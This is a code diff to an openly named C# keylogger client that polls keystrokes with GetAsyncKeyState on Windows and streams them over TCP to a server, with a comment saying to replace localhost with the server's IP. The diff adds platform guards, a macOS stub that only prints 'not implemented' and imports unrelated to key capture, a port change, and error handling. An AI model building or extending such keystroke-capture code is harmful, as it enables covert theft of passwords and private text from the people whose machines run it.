@@ -8,6 +8,7 @@ namespace KeyLoggerClient
 {
     class Program
     {
+#if WINDOWS
         [DllImport("user32.dll")]
         public static extern short GetAsyncKeyState(int vKey);
 
@@ -20,6 +21,16 @@ namespace KeyLoggerClient
         const int VK_SHIFT = 0x10;
         const int VK_CAPITAL = 0x14;
         const int MAPVK_VK_TO_CHAR = 2;
+#elif MACOS
+        [DllImport("/System/Library/Frameworks/Carbon.framework/Versions/Current/Carbon")]
+        private static extern IntPtr CGEventSourceCreate(int sourceStateID);
+
+        [DllImport("/System/Library/Frameworks/Carbon.framework/Versions/Current/Carbon")]
+        private static extern IntPtr CGEventCreateKeyboardEvent(IntPtr source, ushort key, bool keyDown);
+
+        [DllImport("/System/Library/Frameworks/Carbon.framework/Versions/Current/Carbon")]
+        private static extern void CFRelease(IntPtr cf);
+#endif
 
         static void Main(string[] args)
         {
@@ -37,14 +48,24 @@ namespace KeyLoggerClient
             Console.WriteLine("Keylogger is now running. Press 'ESC' to stop.");
 
             // Note: replace localhost ip with the server's IP address
-            using TcpClient client = new TcpClient("127.0.0.1", 5000);
+            using TcpClient client = new TcpClient("127.0.0.1", 5001);
             using NetworkStream stream = client.GetStream();
 
-            RunKeylogger(stream);
+            try
+            {
+                RunKeylogger(stream);
+            }
+            catch (System.Exception e)
+            {
+                Console.WriteLine("An error occurred. Keylogger stopped.");
+                Console.WriteLine(e.Message);
+                throw;
+            }
         }
 
         static void RunKeylogger(NetworkStream stream)
         {
+#if WINDOWS
             bool[] keyStates = new bool[256];
 
             while (true)
@@ -94,8 +115,14 @@ namespace KeyLoggerClient
 
                 Thread.Sleep(10);
             }
+#elif MACOS
+            // Implement macOS-specific key logging logic here
+            // Note: This is a placeholder. Actual implementation will require more detailed handling of macOS key events.
+            Console.WriteLine("Keylogger for macOS is not implemented.");
+#endif
         }
 
+#if WINDOWS
         static bool KeyIsPressed(short keyState)
         {
             return (keyState & 0x8000) != 0;
@@ -155,5 +182,6 @@ namespace KeyLoggerClient
 
             return keyChar.ToString();
         }
+#endif
     }
 }
